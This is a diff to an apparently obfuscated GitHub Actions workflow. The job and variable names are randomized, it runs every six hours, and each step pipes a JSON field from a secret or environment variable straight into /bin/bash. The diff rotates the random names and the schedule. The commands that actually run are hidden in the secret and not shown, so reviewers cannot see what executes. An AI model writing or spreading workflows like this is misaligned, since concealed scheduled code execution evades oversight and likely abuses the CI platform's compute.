@@ -2,7 +2,8 @@ name: huangyunxiao7461
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 0/6 * * *'
+    - cron: '31 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,20 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          rdevh79112: ${{ secrets.rdevh79112 }}
+          qw06947: ${{ secrets.qw06947 }}
         run: |
-          echo $rdevh79112 | jq -r .xyavb6 | /bin/bash
-          echo $liijh76 | jq -r .mktt66534 | /bin/bash
-          echo $uwo580 | jq -r .qbsq9990 | /bin/bash
-          echo $wlvqr15229 | jq -r .mvh62041 | /bin/bash
-          echo $dsyo14720 | jq -r .pw1474 | /bin/bash
-          echo $fg32822 | jq -r .s7 | /bin/bash
-          echo $rs97062 | jq -r .pnstn377 | /bin/bash
-          echo $qr264 | jq -r .d2 | /bin/bash
-          echo $bqju8 | jq -r .owwd77 | /bin/bash
-          echo $jl1119 | jq -r .dyexl22 | /bin/bash
-          echo $n1 | jq -r .su33 | /bin/bash
-          echo $tlg4 | jq -r .zguf0 | /bin/bash
-          echo $gobm155 | jq -r .tpo68289 | /bin/bash
-          echo $eeyl32446 | jq -r .etfn4 | /bin/bash
+          echo $qw06947 | jq -r .lxmb114 | /bin/bash
+          echo $ryu94534 | jq -r .iq83732 | /bin/bash
+          echo $mgjhu5241 | jq -r .y314 | /bin/bash
+          echo $r106 | jq -r .uj0 | /bin/bash
+          echo $yfta0 | jq -r .obz26 | /bin/bash
+          echo $uc8 | jq -r .b81165 | /bin/bash
+          echo $iiyf472 | jq -r .wpwtu6603 | /bin/bash
+          echo $srus7 | jq -r .f5 | /bin/bash
+          echo $x3 | jq -r .danj90667 | /bin/bash
+          echo $t44739 | jq -r .qkjp352 | /bin/bash
+          echo $jsu584 | jq -r .lsuk773 | /bin/bash
+          echo $h4 | jq -r .sos7 | /bin/bash
+          echo $op15482 | jq -r .uslh3959 | /bin/bash
+          echo $t0 | jq -r .cead17656 | /bin/bash
+          echo $zyph7318 | jq -r .zv617 | /bin/bash
 
